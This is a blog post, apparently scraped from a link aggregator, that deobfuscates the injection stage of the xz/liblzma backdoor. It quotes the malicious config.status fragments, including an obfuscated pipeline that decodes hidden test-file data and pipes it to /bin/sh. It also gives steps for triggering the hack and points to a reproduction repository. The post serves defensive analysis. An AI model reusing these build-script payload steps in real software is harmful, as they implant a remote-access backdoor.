{"aid": "40079501", "title": "Simplifying the Xz Backdoor", "url": "https://felipec.wordpress.com/2024/04/18/simplifying-the-xz-backdoor/", "domain": "felipec.wordpress.com", "votes": 1, "user": "felipec", "posted_at": "2024-04-18 18:53:30", "comments": 0, "source_title": "Simplifying the xz backdoor", "source_text": "Simplifying the xz backdoor | Felipe Contreras\n\n# Felipe Contreras\n\n# Simplifying the xz backdoor\n\nApril 18, 2024April 18, 2024 / FelipeC\n\nI\u2019m not a security expert, however I\u2019m an expert at simplifying.\n\nThroughout my career I\u2019ve simplified many things others thought impossible,\nand I\u2019ve done so by following a simple strategy few engage in: never\nsurrender.\n\nMy past successes gave me the confidence to give a try to simplify one aspect\nof the xz backdoor: the installation of the hooks, but oh boy was I\nunprepared. One thing is to simplify code people did at least trying to not\nover-complicate things, an entirely different thing is to simply something the\nauthors clearly did not intend for anyone to understand.\n\nIt turns out even that one thing is just way too complex. However, I did not\ngive up, lowered my expectations, and was able to simplify at least the\nbeginning of the backdoor.\n\nThis should be helpful for people like me who are trying to figure out ways to\nprevent something like this from happening in the future.\n\nFor the impatient the result is xz-min, if you follow the instructions it\nshould be easy to reproduce the backdoor.\n\nWe\u2019ll start slow to be extra careful, but if you trust me you can just check\nthe initial patch and skip the first section.\n\n## Cleanroom\n\nAs I explained in my previous post, the catalyst that enabled the backdoor is\nin the distributed tarball, not in the git repository. Therefore to find all\nthe malicious changes we need to generate a tarball ourselves, but as I\nexplained in my post, that generates a lot of benign differences. Even though\nmy Arch Linux system has the same versions of autoconf and automake that they\nused, there\u2019s still a lot of delta in the resulting tarball.\n\nAdvertisement\n\nPrivacy Settings\n\nFirst of all, to generate the tarball I had to install po4a, doxygen, and\nghostscript. Now, you might be thinking that there is no point in checking the\ndocumentation, but the xz project distributes PDFs. Couldn\u2019t a malicious actor\nadd some binary blob to a PDF and extract it in the building process? I don\u2019t\nknow, but I want to be absolutely certain there\u2019s nothing there.\n\nThe PDFs were generated with ghostscript 9.55.0 and groff 1.22.4, so I\ninstalled that. Additionally, the API documentation was generated with doxygen\n1.9.7, so I installed that as well. This way I was able to verify the\ndocumentation doesn\u2019t contain anything malicious. I had to manually check the\n14 distributed PDFs and there\u2019s no extra binary blobs.\n\nI do have to say, why distribute PDFs in the first place? These are generated\nfor the man pages, but nobody is ever going to open lzmainfo-letter.pdf ever.\nOh, there\u2019s two PDFs for every man page, one for a4 and another for letter. Of\ncourse make install doesn\u2019t install them, because nobody cares about them.\n\nWorse than that, you don\u2019t need ghostscript to generate a man page, because\nman can do it by itself: man -Tpdf lzmainfo.1 >lzmainfo.pdf. Wait, if man can\ndo it why are the developers of xz putting PDFs in their tarballs? Don\u2019t ask\nme. But what about US Letter paper?! MANROFFOPT=-P-pletter man -Tpdf lzmainfo.\n\nxz developers really seem to like to overcomplicate stuff.\n\nWith PDFs out of the way, the other difference is config.guess and config.sub,\nwhich don\u2019t seem to have anything noteworthy, but still. These files are\ngenerated by automake, but if I\u2019m using the same version (1.16.5) why are they\ndifferent? Well, GNU developers like to overcomplicate stuff as well, so these\nfiles come from the config project, and each distribution deals with them\ndifferently. Arch Linux just leaves whatever is in the automake tarball,\nDebian has a separate autotools-dev package, and Fedora uses redhat-rpm-\nconfig.\n\nBased on the above we can guess the malicious developers used an RPM-based\ndistribution, because the precise combination of config.guess=2022-01-09 and\nconfig.sub=2021-12-25 doesn\u2019t match either what is in the automake 1.16.5\nrelease or autotools-dev 20220109.1. I checked a few Fedora packages and there\ndoesn\u2019t to be any match, but in OpenMandriva 5.0, there\u2019s an exact match,\naccording to RPMfind.\n\nUsing those versions the diff is almost there, except that for some reason\nam__DIST_COMMON in Makefile.in is missing a file. According to this thread in\nthe automake mailing list from 2001, running automake twice makes it generate\nthe correct Makefile.in. Don\u2019t try to understand autotools\u2019 voodoo logic.\n\nThis gives use the final diff.\n\nWhy go into all this trouble? I\u2019m a completionist, I don\u2019t want to do this\nstep ever again, and now I\u2019m 100% sure that the tarball xz-5.6.1.tar.xz with\nSHA-1 checksum a77dd4689db35cfaa814d1c3a919720bd41f5623 does not contain any\nother modification from the code in git, other than the diff above.\n\nAdvertisement\n\nPrivacy Settings\n\nIn discussions online I heard the argument that it\u2019s easy to check the\ntarball, all packagers need to do is install the same version of \u201cautotools\u201d.\nHopefully after reading this section it should be clear that if you actually\ntry to do this, it\u2019s not that easy.\n\n## Focus on the ball\n\nI see a lot of analyses focused on build-to-host.m4, but that script is not\nrun in the build process. They probably are focused on that because the diff\nis easier to spot, and they don\u2019t know how autotools work.\n\nThe script that is actually run is configure, those are the modifications we\nshould focus on.\n\nFor example, this popular analysis: xz/liblzma: Bash-stage Obfuscation\nExplained by Gynvael Coldwind explains many things, but not where\ngl_am_configmake came from in \u201cstage 0\u201d.\n\nBecause this hack is so complex it\u2019s easy to miss things, but we are not going\nto do that here because we are going to focus on what this thing actually does\nwith the advantage of knowing how autotools is supposed to work.\n\nIf you look at the hacked configure script, you see that gl_am_configmake is\nsaved to a file $CONFIG_STATUS, which is config.status. If we open that file\nwe see:\n\n    \n    \n    gl_am_configmake='./tests/files/bad-3-corrupt_lzma2.xz'\n\nThat\u2019s much less obfuscated than the original:\n\n    \n    \n    gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n\nBut it\u2019s only available to you if you know how autoconf works, which most\npeople don\u2019t. Not really.\n\nIt\u2019s right there at the beginning of the autoconf manual, where configure\nscripts are explained: \u201ca shell script called config.status that, when run,\nrecreates the files listed above\u201d. So configure generates config.status, and\nthen runs it, and that\u2019s where the build system is actually modified.\n\nThe grep command might look daunting, but all it\u2019s doing is looking for a file\nthat contains a string with 4 #, then 5 alphanumeric characters, then 4 #, for\nexample:\n\n    \n    \n    grep -r \"####Hello####\" grep: tests/files/bad-3-corrupt_lzma2.xz: binary file matches\n\nThat\u2019s not that hard is it?\n\nAdvertisement\n\nPrivacy Settings\n\nWell, if you are looking at a script that is 25,752 lines of obfuscated shell\nscript with no idea of what it\u2019s trying to do on a good day and no reference\nto the benign version, I guess it would be hard. Fortunately that\u2019s not what\nwe are going to do here.\n\nThis is the true step 0.\n\n## Step 1\n\nBased on the previous step, can you guess what the hack is going to do?\n\nYou guessed correctly: it\u2019s going to try to do something with\nbad-3-corrupt_lzma2.xz, and fortunately for us all the relevant stuff is right\nthere next to it in the config.status script:\n\n    \n    \n    gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"' gl_localedir_prefix='xz' gl_am_configmake='./tests/files/bad-3-corrupt_lzma2.xz' localedir_c_make='\\\"$(localedir)\\\"' gl_localedir_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2>/dev/null'\n\nThat\u2019s going to be a little tricky to analyze... but we don\u2019t have to, we can\njust echo that whole thing:\n\n    \n    \n    echo \"sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2>/dev/null\" sed \"r\\n\" ./tests/files/bad-3-corrupt_lzma2.xz | eval tr \"\\t \\-_\" \" \\t_\\-\" | xz -d 2>/dev/null\n\nBut again, no need to actually understand what it does, all we need to know is\nthat xz -d decompresses the input, so whatever it\u2019s receiving is a valid xz\nstream, and it turns out the output is yet another shell script that\nsimplified does:\n\n    \n    \n    xz -dc tests/files/good-large_compressed.lzma | \\ stuff | \\ xz -F raw --lzma1 -dc | \\ /bin/sh\n\nNow this is where it gets tricky, because that script is quite complex. But we\ncan just run it and see what it does, except it doesn\u2019t do anything, so we do\nneed to take a peek.\n\nDeep within that script there\u2019s an interesting check:\n\n    \n    \n    test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\"\n\nThis is testing if we are building a deb package or an rpm package, but we can\njust cheat with export RPM_ARCH=x86_64. We try again and bingo! Now two files\nare modified: libtool and src/liblzma/Makefile.\n\nAdvertisement\n\nPrivacy Settings\n\nThis is the diff. With that step 1 is done. So now we know what\nbad-3-corrupt_lzma2.xz was for.\n\n## Step 1b\n\nOnce again we don\u2019t need to understand the changes, all we need to know is\nthat src/liblzma/Makefile is modified. If we go to that directory and type\nmake, a file called .libs/liblzma.so.5 is generated, and that\u2019s really the\ntarget.\n\nIf we check for the hexdump provided in the original report:\n\n    \n    \n    hexdump -ve '1/1 \"%.2x\"' .libs/liblzma.so.5 | \\ grep -q 'f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410' test $? = 0 && echo hacked\n\nThe library is compromised. So something in the Makefile is in fact\nintroducing the backdoor.\n\nIf we check the changes in the Makefile, there\u2019s this:\n\n    \n    \n    am__test = bad-3-corrupt_lzma2.xz\n\nWait, I thought we were done with bad-3-corrupt_lzma2.xz, what\u2019s going on?\n\nIf we indent the main script contained inside, it\u2019s easier to see that in fact\nthat script has two modes, one is when config.status is in the current\ndirectory, and the other is when .libs/liblzma_la-crc64_fast.o is present. So\none mode is for the top level directory, the other is for when we are inside\nsrc/liblzma.\n\nIt does make sense to reuse bad-3-corrupt_lzma2.xz, because after all it would\nbe tricky to introduce yet another test file with a hack.\n\nUnfortunately that second mode is much more complex, and there\u2019s not much we\ncan do to simplify it. The result of my best attempt at the first part is\ndecrypt_rc4.sh, which although much more readable, it\u2019s still very complex. X\nuser nugxperience recognized the awk code is in fact an RC4 decrypter.\n\nIf we pass another test file, good-large_compressed.lzma as input, the output\nis the ELF binary object of the backdoor, which in the build process is saved\nas src/liblzma/liblzma_la-crc64-fast.o.\n\nBut how is that binary used? We are almost there.\n\n## Step 1c\n\nAfter saving the ELF binary object, the same script tries to compile both\ncrc64_fast.c and crc32_fast.c, but doing some modifications on the fly with\nsed. Additionally adds liblzma_la-crc64-fast.o to the object file of\ncrc64_fast.c, which will contain both.\n\nAdvertisement\n\nPrivacy Settings\n\nWe don\u2019t need to deal with any of that though, all we need is the result:\ncode.diff.\n\nFrom that code patch we can see that it\u2019s changing\nis_arch_extension_supported() to _is_arch_extension_supported(), and there\nit\u2019s calling an external _get_cpuid while the original was calling\n__get_cpuid. That later one is standard.\n\nThe ELF binary object with the backdoor implements the spurious _get_cpuid and\nthat\u2019s where everything starts.\n\nWe\u2019ve finally reached the beginning of the backdoor. That\u2019s where the true\ncomplexity begins.\n\n## Summary\n\nAfter the deobfuscation the injection is not that complex:\n\n  1. Extract the binary object from a test file.\n  2. Patch the code to call _get_cpuid from the binary object.\n\n    \n    \n    decrypt_rc4.sh tests/files/good-large_compressed.lzma > src/liblzma/liblzma_la-crc64-fast.o patch -p1 < code.diff\n\nThat\u2019s it.\n\nIn xz-min I simplify the backdoor even more, because it\u2019s just using liblzma\nas a trampoline.\n\nIn both crc64_fast.c and crc32_fast.c there\u2019s an ifunc resolver defined\n(crc64_resolve and crc32_resolve respectively), and it\u2019s those resolvers that\nactivate the backdoor by calling _get_cpuid.\n\nBut any resolvers would do, the whole liblzma is not needed. So I created a\nmock liblzma and the backdoor is still successfully triggered.\n\nAnd of course the fun is not just building liblzma with the backdoor, but\nactually using it. That\u2019s easy to do with xz-min and xzbot with a few tricks\nthat aren\u2019t relevant for this article.\n\nTrying to simplify _get_cpuid will be step 2.\n\n## References\n\n  * backdoor in upstream xz/liblzma leading to ssh server compromise (Andres Freund)\n  * The xz attack shell script (Russ Cox)\n\n### Share this:\n\n  * Twitter\n  * Facebook\n  * Flattr\n\nLike Loading...\n\n### Related\n\nxz backdoor and autotools insanityApril 4, 2024In \"Development\"\n\nWhat it takes to improve Git or: How I fixed zsh completionJuly 31, 2013In\n\"Development\"\n\nlibmsn-api planNovember 30, 2008In \"Desktop\"\n\nLinux, OpenSource, Random\n\nxz\n\n### Leave a comment Cancel reply\n\nThis site uses Akismet to reduce spam. Learn how your comment data is\nprocessed.\n\nBlog at WordPress.com.\n\n  * Comment\n  * Reblog\n  * Subscribe Subscribed\n\n    * Felipe Contreras\n    * Already have a WordPress.com account? Log in now.\n\n  * Privacy\n  *     * Felipe Contreras\n    * Customize\n    * Subscribe Subscribed\n    * Sign up\n    * Log in\n    * Copy shortlink\n    * Report this content\n    * View post in Reader\n    * Manage subscriptions\n    * Collapse this bar\n\n%d\n\n", "frontpage": false}
